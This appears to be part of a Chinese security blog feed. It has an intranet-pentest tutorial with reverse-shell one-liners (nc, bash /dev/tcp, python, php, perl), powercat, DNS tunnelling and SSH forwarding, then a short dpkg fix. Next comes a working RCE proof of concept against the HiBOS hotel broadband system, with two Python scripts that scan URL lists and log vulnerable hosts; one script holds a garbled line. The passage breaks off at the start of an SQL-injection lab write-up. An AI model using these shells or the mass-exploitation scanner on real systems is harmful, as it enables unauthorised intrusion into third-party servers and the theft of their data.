<h6 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h6><p>客户端连接服务器，服务器获取客户端的shell（kali【攻击机】监听，目标机连接）</p>
<p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机 ：<code>nc 192.168.0.130 8888 -e /bin/sh</code></p>
<p>如果是windows <code>nc -lvp lport -e c:\windows\system32\cmd.exe </code></p>
<p><img src="/posts/11ff0b53/nc_shell2.png"></p>
<h6 id="python反向shell"><a href="#python反向shell" class="headerlink" title="python反向shell"></a>python反向shell</h6><p>注意：这里使用的python2进行反弹shell</p>
<p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机：<code>python2 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.128&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p>
<p><img src="/posts/11ff0b53/nc_shell3.png"></p>
<h6 id="bash反向shell"><a href="#bash反向shell" class="headerlink" title="bash反向shell"></a>bash反向shell</h6><p>攻击机：<code>nc -lvp 8888 </code></p>
<p>目标机：<code>bash -i &gt;&amp; /dev/tcp/192.168.0.128/8888 0&gt;&amp;1</code></p>
<p><img src="/posts/11ff0b53/nc_shell4.png"></p>
<h6 id="php反向shell"><a href="#php反向shell" class="headerlink" title="php反向shell"></a>php反向shell</h6><p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机：<code>php -r &#39;$sock=fsockopen(&quot;192.168.0.128&quot;,8888);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p>
<p>由于ubuntu没装php环境就不截图演示了</p>
<h6 id="perl反向shell"><a href="#perl反向shell" class="headerlink" title="perl反向shell"></a>perl反向shell</h6><p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机：<code>perl -e &#39;use Socket;$i=&quot;192.168.0.128&quot;;$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></p>
<h6 id="内网代理弹shell"><a href="#内网代理弹shell" class="headerlink" title="内网代理弹shell"></a>内网代理弹shell</h6><p><img src="/posts/11ff0b53/neiwangdaili_shell.jpg"></p>
<p>kali执行:<code>nc -lvp 3333</code><br>数据库执行:<code>nc -lvp 3333 -e /bin/sh</code><br>web服务器执行：<code>nc -v 192.168.1.4 3333 -c &quot;nc -v 1.1.1.200 3333&quot;</code></p>
<p>原理：web服务器当作中间机，连接kali和数据库的3333端口，使kali与数据库通信</p>
<h6 id="exec反弹shell"><a href="#exec反弹shell" class="headerlink" title="exec反弹shell"></a>exec反弹shell</h6><p>攻击机：<code>nc -lvp 8888</code></p>
<p>目标机：<code>0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/192.168.0.128/8888; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></p>
<p><img src="/posts/11ff0b53/nc_shell5.png"></p>
<p>可以利用python2 变为交互式的shell <code>python2 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<p>或<code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<hr>
<h5 id="powercat使用"><a href="#powercat使用" class="headerlink" title="powercat使用"></a>powercat使用</h5><p>powercat可以理解成powershell版的natcat,</p>
<p>下载地址： <a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p>
<p>下载下来的powercat.ps1文件 进行导入<code> Import-Module .\powercat.ps1</code></p>
<p>如果权限不足 以管理员身份打开powershell<code>Set-ExecutionPolicy Unrestricted</code>输入Y</p>
<p><code>Get-ExecutionPolicy</code>查看当前ps权限</p>
<p> <code>powercat -h</code>测试是否导入成功</p>
<p><img src="/posts/11ff0b53/powercat1.png"></p>
<p>在win10中更改poweshell权限 <code>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe </code>以管理员权限运行，在本机进行尝试时，每次导入模块后系统都会将powercat.ps1删除掉…</p>
<blockquote>
<p>#powercat  命令参数</p>
<p>-l 监听模式</p>
<p>-p 指定监听端口</p>
<p>-e 指定启动进程的名称</p>
<p>-v 显示详情</p>
<p>-c 指定想要连接的 IP 地址</p>
<p>-ep 返回 powershell -dns 使用 dns 通信</p>
<p>-g 生成 payload -ge 生成经过编码的 payload，可以直接使用 powershell </p>
<p>-e 执行该 payload</p>
</blockquote>
<h6 id="通过nc正向连接powercat"><a href="#通过nc正向连接powercat" class="headerlink" title="通过nc正向连接powercat"></a>通过nc正向连接powercat</h6><p>win7：<code>powercat -l -p 8888 -e cmd.exe -v</code></p>
<p>kali：<code>nc 192.168.0.129 8888</code></p>
<p><img src="/posts/11ff0b53/powercat_shell1.png"></p>
<h6 id="通过nc反向连接powercat"><a href="#通过nc反向连接powercat" class="headerlink" title="通过nc反向连接powercat"></a>通过nc反向连接powercat</h6><p>kali：<code>nc -l -p 8888 -v </code></p>
<p>win7：<code>powercat -c 192.168.0.128 -p 8888 -v -e cmd.exe</code></p>
<h6 id="返回powershell"><a href="#返回powershell" class="headerlink" title="返回powershell"></a>返回powershell</h6><p>win7：<code>powercat -l -v -p 8888</code></p>
<p>win2008：<code>powercat -c 192.168.0.129 -p 8888 -v -ep</code></p>
<p><img src="/posts/11ff0b53/powercat_shell3.png"></p>
<h6 id="powercat-生成paylaod"><a href="#powercat-生成paylaod" class="headerlink" title="powercat 生成paylaod"></a>powercat 生成paylaod</h6><p>win7： <code>Powercat -l -p 8888 -e cmd -v -g &gt;&gt;shell.ps1</code> 将shell.ps1传到win2008并执行</p>
<p>win7：<code>powercat -c 192.168.0.132 -p 8888 -v</code></p>
<p>这里试了好几次都没成功…….</p>
<p>不想生成文件的话们可以使用 -ge 生成编码后的payload</p>
<p>win7：<code>powercat -c 192.168.0.129 -p 8888 -ep -ge</code></p>
<h6 id="创建dns隧道连接"><a href="#创建dns隧道连接" class="headerlink" title="创建dns隧道连接"></a>创建dns隧道连接</h6><p>在kali上安装discat</p>
<blockquote>
<p>git clone <a href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a><br>cd dnscat2/server/<br>gem install bundler<br>bundle install</p>
</blockquote>
<p>同时安装ruby环境</p>
<p>开启服务端 <code>ruby dnscat2.rb powercat -e open --no-cache</code></p>
<p>在win7目标机执行以下命令 建立dns隧道</p>
<p><code>powercat -c 192.168.0.128 -p 53 -dns powercat -e cmd.exe</code> 这里ip为kali ip</p>
<p><img src="/posts/11ff0b53/powercat_win7.PNG"></p>
<p>在win7执行完命令后会获得一个session</p>
<p><img src="/posts/11ff0b53/powercat_dns_shell.PNG"></p>
<p><code>session -i 1</code></p>
<p><img src="/posts/11ff0b53/powercat_dns_shell2.PNG"></p>
<p>但是使用该隧道在执行命令时会有些卡，不建议使用</p>
<h6 id="powercat作为跳板进行转发"><a href="#powercat作为跳板进行转发" class="headerlink" title="powercat作为跳板进行转发"></a>powercat作为跳板进行转发</h6><p>kali：192.168.0.128</p>
<p>win7：192.168.0.129</p>
<p>win2008：192.168.0.132</p>
<p>win7做跳板，让kali通过win7连接win2008</p>
<p>win2008  <code>powercat -l -v -p 4444 -e cmd.exe</code></p>
<p>win7 <code>powercat -l -v -p 5555 -r tcp:192.168.0.132:4444</code></p>
<p>kali <code>nc  192.168.0.129 5555 -vv</code></p>
<hr>
<h3 id="SSH隧道"><a href="#SSH隧道" class="headerlink" title="SSH隧道"></a>SSH隧道</h3><h4 id="SSH功能："><a href="#SSH功能：" class="headerlink" title="SSH功能："></a>SSH功能：</h4><p> 1.<strong>加密</strong>SSH Client 端值 SSH Server 端之间的通讯数据</p>
<p>2.<strong>突破防护墙的限制</strong>完成一些无法建立的TCP连接</p>
<h4 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h4><p><code>ssh root@192.168.0.129 -P 22</code></p>
<p>本质为端口转发</p>
<blockquote>
<p>环境配置<br>win7    192.168.0.129(NAT)  10.10.0.130(仅主机)<br>kali        192.168.0.128(NAT)<br>ubuntu 192.168.0.130(NAT)<br>win2008  10.10.0.131(仅主机)</p>
</blockquote>
<h4 id="密码登录于中间人攻击"><a href="#密码登录于中间人攻击" class="headerlink" title="密码登录于中间人攻击"></a>密码登录于中间人攻击</h4><p>1..远程主机收到用户登录请求，吧自己的公钥发给用户</p>
<p>2.用户使用该公钥，将密码加密后，发给远程主机</p>
<p>3.远程主机用自己的私钥，解密登录密码，如果密码正确，用户就能登录</p>
<blockquote>
<p>服务器  ==========&gt; 用户 =====================&gt; 服务器  </p>
<p>————发送公钥———–利用公钥加密私钥并发送—-密码验证（Y/N）</p>
</blockquote>
<br>

<p>SSH隧道原理</p>
<ul>
<li>本地端口转发</li>
</ul>
<blockquote>
<p>client/kali ————— 跳转机 ubnutu —————-server/win2008</p>
<p>192.168.0.128———–jump/192.168.0.129————10.10.0.135</p>
<p>——————————–10.10.0.137———————</p>
</blockquote>
<p><code>ssh -L 本地端口:目标主机:目标端口  jump主机host</code></p>
<p><code>ssh -L 2121:10.10.0.2:21 root@192.168.0.129</code></p>
<blockquote>
<p>建立SSH隧道常用参数<br>-C 压缩传输，提高传输速度。<br> -f 将 SSH 传输转入后台执行，不占用当前 shell<br>-N 建立静默连接（建立了连接但看不到具体会话）<br> -g 允许远程主机连接本地用于转发的端口。<br> -L 本地端口转发<br> -R 远程端口转发<br> -D 动态转发（ SOCKS 代理）<br> -p 指定 SSH 端口</p>
</blockquote>
<ul>
<li>远程端口转发</li>
</ul>
<blockquote>
<p>client/ kali—————–jump/ubuntu——————-server/win2008</p>
<p>192.168.0.128————–10.10.0.129    ———————10.10.0.135</p>
<p>——————————没有外网ip————————————</p>
<p>—————————-但是可以连接外网——————————</p>
</blockquote>
<p>跳转机为纯内网环境，但是可以访问外网</p>
<p>也就是说，跳转机可以访问kali，kali无法访问跳转机，在跳转机上建立一个与kali的连接，然后再kali上使用这个连接  然后将所有数据通过跳转机转发给目标主机的目标端口  (在这里远程主机为kali)</p>
<p><code>ssh -R 远程主机端口:目标主机：目标主机端口 跳转机</code></p>
<p><code>ssh -R 2121:10.10.0.135:21  10.10.0.129</code></p>
<blockquote>
<p>建立SSH隧道常用参数<br>-C 压缩传输，提高传输速度。<br> -f 将 SSH 传输转入后台执行，不占用当前 shell<br>-N 建立静默连接（建立了连接但看不到具体会话）<br> -g 允许远程主机连接本地用于转发的端口。<br> -L 本地端口转发<br> -R 远程端口转发<br> -D 动态转发（ SOCKS 代理）<br> -p 指定 SSH 端口</p>
</blockquote>
<ul>
<li>动态转发</li>
</ul>
<p>建立一个 socks 连接，任何支持 socks 4/5 协议的程序都可以使用这个加密通道进行访问</p>
<p>可以参考梯 子 </p>
<p><code>ssh -D 8080 user@host</code></p>
<blockquote>
<p>外网去访问内网中的二级服务器</p>
<p>外网  —————  一级服务器 ——–防火墙  ——– 二级服务器<br>——–外网    |  内网  ——— 二级服务器只能通过一级服务器访问</p>
<p>在一级服务器上通过本地端口转发，把二级服务器上的流量导到一级服务器上。这样就可以通过一级服务器去访问二级服务器。 所以 二级服务器中的服务器可以通过远程端口转发的方法直接映射到外网的主机，将二级内网的流量直接导入到外网主机的端口，从而实现从外网去访问二级主机</p>
</blockquote>
<br>

<h4 id="SSH隧道利用"><a href="#SSH隧道利用" class="headerlink" title="SSH隧道利用"></a>SSH隧道利用</h4><h5 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h5><h6 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h6><blockquote>
<p>kali 192.168.0.128（NAT）<br>winserver2008  10.10.0.139（VM18 仅主机）<br>Ubuntu 192.168.0.130（NAT）10.10.0.137（VM18 仅主机）</p>
</blockquote>
<br>

<blockquote>
<p>开启 winServer2008 远程连接 <a href="https://www.cnblogs.com/Tanghongchang/p/7445786.html">https://www.cnblogs.com/Tanghongchang/p/7445786.html</a></p>
</blockquote>
<p>kali执行以下命令，将内网主机的3389端口映射到自己的3389端口</p>
<p><code>ssh -CfNg -L 攻击主机端口:内网办公主机IP:内网办公主机端口 Web服务器ssh用户名@Web服务器IP</code></p>
<p><code>ssh -CfNg -L 3333:10.10.0.139:3389 mamor@192.168.0.130 </code></p>
<p>通过服务器 192.168.0.139作为跳板 将内网主机winServer2008 的3389端口转发到kali的3388端口，然后访问kali的3333端口即可访问到WinServer2008的3389端口了</p>
<p>使用netstat 进行判断是否建立代理转发</p>
<p><code>netstat -pantu | grep &quot;3333&quot;</code></p>
<p><img src="/posts/11ff0b53/ssh_bendi1.png"></p>
<p>（连接被重设：我先在winServer2008中打开了远程服务 然后用Vm18网段的机器测试完 之后发现winServer2008的ip变了，然后一直在找原因 为什么连不同了…然后改下ssh命令的winserver ip就好了） </p>
<p>然后输入账号密码 即可登录到10.10.0.139 winServer2008服务器中</p>
<p><img src="/posts/11ff0b53/ssh_bendi2.png"></p>
<h5 id="远程端口转发"><a href="#远程端口转发" class="headerlink" title="远程端口转发"></a>远程端口转发</h5><p>环境</p>
<blockquote>
<p>kali 192.168.0.128(NAT模式)</p>
<p>Ubuntu 10.10.0.137(VM18 仅主机)</p>
<p>winServer2008 10.10.0.139 (VM18仅主机)0</p>
</blockquote>
<blockquote>
<p>删除Ubuntu的nat 网卡，现在仅有VM18一块网卡(10.10.0.0/24网段的)</p>
<p>但是在设置网络的时候没找到相关的文字，没成功连上外网，之后有时间整个vps复现</p>
</blockquote>
<p><code>ssh -R 远程主机端口:目标主机：目标主机端口 跳转机</code></p>
<p>使用 -R 创建一个远程转发模式的隧道</p>
<p><code>ssh -CfNg -R 3333:10.10.0.139:3389  mamor@192.168.0.130</code></p>
<p>使用<code>netstat</code>判断代理转发是否成功建立</p>
<p><code>netstat  -ano | grep &quot;3333&quot; </code></p>
<p><code>rdesktop 127.0.0.1:3333</code></p>
<br>

<h5 id="动态转发"><a href="#动态转发" class="headerlink" title="动态转发"></a>动态转发</h5><h6 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h6><blockquote>
<p>kali 192.168.0.128(NAT)</p>
<p>Ubuntu 192.168.0.130(NAT) 10.10.0.137(VM18 仅主机)</p>
<p>WinServer2008 10.10.0.139(VM18 仅主机)</p>
</blockquote>
<br>

<p><code>ssh -CfNg -D 攻击主机端口 Web服务器ssh用户名@Web服务器IP</code></p>
<p> <code>ssh -CfNg -D 8888  mamor@192.168.0.130</code></p>
<p>然后使用proxychains4 代理</p>
<p><code>sudo vim /etc/proxychains4.conf</code></p>
<p>添加<code>socks5 127.0.0.1 8888</code></p>
<p>然后使用<code>proxychains4 firefox 10.10.0.139 </code>成功访问到内网WinServer2008 的web页面</p>
<p><img src="/posts/11ff0b53/ssh_dongtai1.png"></p>
<p><img src="/posts/11ff0b53/ssh_dongtai2.png"></p>
<p>但是 使用firefox的代理插件SwitchyOmega 无法访问内网的web页面</p>
<p>使用proxychains4 访问WinServer2008的3389端口</p>
<p><code>proxychains4 rdesktop 10.10.0.139:3389 </code></p>
<p><img src="/posts/11ff0b53/ssh_dongtai_rdesktop1.png"></p>
<p><img src="/posts/11ff0b53/ssh_dongtai_rdesktop2.png"></p>
<p>成功访问3389端口</p>
<br>

<hr>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://websec.readthedocs.io/zh/latest/intranet/index.html">https://websec.readthedocs.io/zh/latest/intranet/index.html</a></p>
<p><a href="https://c.wgpsec.org/p/10053">https://c.wgpsec.org/p/10053</a></p>
<p><a href="https://www.icode9.com/content-3-780098.html">https://www.icode9.com/content-3-780098.html</a></p>
<p><a href="https://yoga7xm.top/2019/03/27/IPentest-discover/">https://yoga7xm.top/2019/03/27/IPentest-discover/</a></p>
<p><a href="https://www.cnblogs.com/-chenxs/p/12378110.html">https://www.cnblogs.com/-chenxs/p/12378110.html</a></p>
<p><a href="https://soapffz.com/sec/21.html">https://soapffz.com/sec/21.html</a></p>
<p><a href="https://www.freebuf.com/sectool/243115.html">https://www.freebuf.com/sectool/243115.html</a></p>
<p><a href="https://teamssix.com/year/210601-155103.html">https://teamssix.com/year/210601-155103.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>E:dpkg被中断，您必须手工运行sudodpkg</title>
    <url>/posts/14f5ef78/</url>
    <content><![CDATA[<p>解决方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm &#x2F;var&#x2F;lib&#x2F;dpkg&#x2F;updates&#x2F;*</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>HiBOS酒店宽带运营系统RCE漏洞POC</title>
    <url>/posts/c20f4593/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload </span><br><span class="line">url + &#x2F;manager&#x2F;radius&#x2F;server_ping.php?ip&#x3D;127.0.0.1|cat &#x2F;etc&#x2F;passwd &gt;..&#x2F;..&#x2F;aaa.txt&amp;id&#x3D;1</span><br><span class="line">访问 url + &#x2F;aaa.txt</span><br><span class="line"></span><br><span class="line">如果存在 root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">说明漏洞存在</span><br></pre></td></tr></table></figure>

<p>v0.1单线程版 后续完善 用法<br><code>python3 poc.py -u url</code><br><code>python3 poc.py -f url.txt</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*  HiBOS酒店宽带运营系统RCE漏洞POCv0.1  *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[*]url形式不符合！ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">%<span class="number">20</span>&gt;../../aaa.txt&amp;<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    req = requests.get(url=url1, headers=header, verify=False)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    url2 = url + &#x27;</span>/aaa.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    req2 = requests.get(url=url2, headers=header, verify=False)</span></span><br><span class="line"><span class="string">    if &#x27;</span>root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash<span class="string">&#x27; in req2.text:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;--------------存在漏洞[*]&quot;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&quot;[*] url:&quot; + url + &quot;-------------不存在漏洞[*]&quot;)</span></span><br><span class="line"><span class="string">def main():</span></span><br><span class="line"><span class="string">    parser = OptionParser()</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, default = &#x27;</span><span class="string">&#x27; , type=str, help=&#x27;</span>输入url<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;file&quot;, default= &#x27;</span><span class="string">&#x27;, help=&#x27;</span>收集的txt<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    (option, args) = parser.parse_args()</span></span><br><span class="line"><span class="string">    # print(parser.parse_args())</span></span><br><span class="line"><span class="string">    url = option.url</span></span><br><span class="line"><span class="string">    file = option.file</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if file != &#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        print(&quot;[*] Start .......              [*]&quot;)</span></span><br><span class="line"><span class="string">        with open(file,&#x27;</span><span class="string">r&#x27;) as f:</span></span><br><span class="line"><span class="string">            for line in f.readlines():</span></span><br><span class="line"><span class="string">                url = line.strip()</span></span><br><span class="line"><span class="string">                url = parse_url(url)</span></span><br><span class="line"><span class="string">                exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print(&quot;[*] End .......                [*]&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if url !=&#x27;</span><span class="string">&#x27;:</span></span><br><span class="line"><span class="string">        exp(url)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    banner()</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure>

<p>使用多线程 把结果存处output.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">thread = []</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*  HiBOS酒店宽带运营系统RCE漏洞POCv0.2  *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*                      Mamor        *&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -u ,--url url                   &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;     -f ,--file urls.txt             &quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;*-----------------------------------*&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_url</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">in</span> url:</span><br><span class="line">                url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = <span class="string">&quot;https://&quot;</span> + url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">&quot;[*]url形式不符合！ %s [*]&quot;</span> % url)</span><br><span class="line">    <span class="keyword">return</span> url</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd%20&gt;../../aaa.txt&amp;id=1&#x27;</span></span><br><span class="line">    url1 = url + payload</span><br><span class="line">    req = requests.get(url=url1, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># print(req.status_code)</span></span><br><span class="line"></span><br><span class="line">    url2 = url + <span class="string">&#x27;/aaa.txt&#x27;</span></span><br><span class="line">    <span class="comment"># print(url2)</span></span><br><span class="line">    req2 = requests.get(url=url2, headers=header, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;root:x:0:0:root:/root:/bin/bash&#x27;</span> <span class="keyword">in</span> req2.text:</span><br><span class="line">        print(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;--------------存在漏洞[*]&quot;</span>)</span><br><span class="line">        output = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&quot;a+&quot;</span>)  </span><br><span class="line">        output.write(url + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        output.close()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] url:&quot;</span> + url + <span class="string">&quot;-------------不存在漏洞[*]&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--url&quot;</span>, dest=<span class="string">&quot;url&quot;</span>, default = <span class="string">&#x27;&#x27;</span> , <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;输入url&#x27;</span>)</span><br><span class="line">    parser.add_option(<span class="string">&quot;-f&quot;</span>, <span class="string">&quot;--file&quot;</span>, dest=<span class="string">&quot;file&quot;</span>, default= <span class="string">&#x27;&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;收集的txt&#x27;</span>)</span><br><span class="line">    (option, args) = parser.parse_args()</span><br><span class="line">    <span class="comment"># print(parser.parse_args())</span></span><br><span class="line">    url = option.url</span><br><span class="line">    file = option.file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> file != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        print(<span class="string">&quot;[*] Start .......              [*]&quot;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">                url = line.strip()</span><br><span class="line">                url = parse_url(url)</span><br><span class="line"></span><br><span class="line">                t = threading.Thread(target=exp, args=(url,))</span><br><span class="line">                thread.append(t)</span><br><span class="line">        print(thread)</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> thread:</span><br><span class="line">            t.join()</span><br><span class="line">                <span class="comment"># exp(url)</span></span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;[*] End .......                [*]&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> url !=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        exp(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    banner()</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>POC</category>
      </categories>
      <tags>
        <tag>POC</tag>
      </tags>
  </entry>
  <entry>
    <title>zkaq内网靶场1</title>
    <url>/posts/3796bdc4/</url>
    <content><![CDATA[<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>输入 <code>?id=1&#39;</code> 网站报错 爆出网站的绝对路径</p>
<p><img src="/posts/3796bdc4/dir.png"></p>
<p>?id=1 order by 2 发现存在两个字段</p>
<p>使用union select没有回显，使用 into outfile 进行文件写入</p>
